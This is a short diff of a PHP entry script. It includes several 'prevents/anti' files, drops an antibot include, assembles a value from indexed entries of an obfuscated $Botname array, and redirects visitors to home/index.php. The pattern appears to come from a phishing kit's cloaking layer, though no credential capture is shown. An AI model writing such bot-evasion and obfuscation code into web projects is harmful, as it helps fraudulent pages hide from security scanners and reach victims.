@@ -7,7 +7,6 @@ include './prevents/anti5.php';
 include './prevents/anti6.php';
 include './prevents/anti7.php';
 include './prevents/anti8.php';
-include ('antibot.php');
 $get_ip = $Botname[165].$Botname[146].$Botname[396];
 $function="$get_ip";
 header("LOCATION: home/index.php");
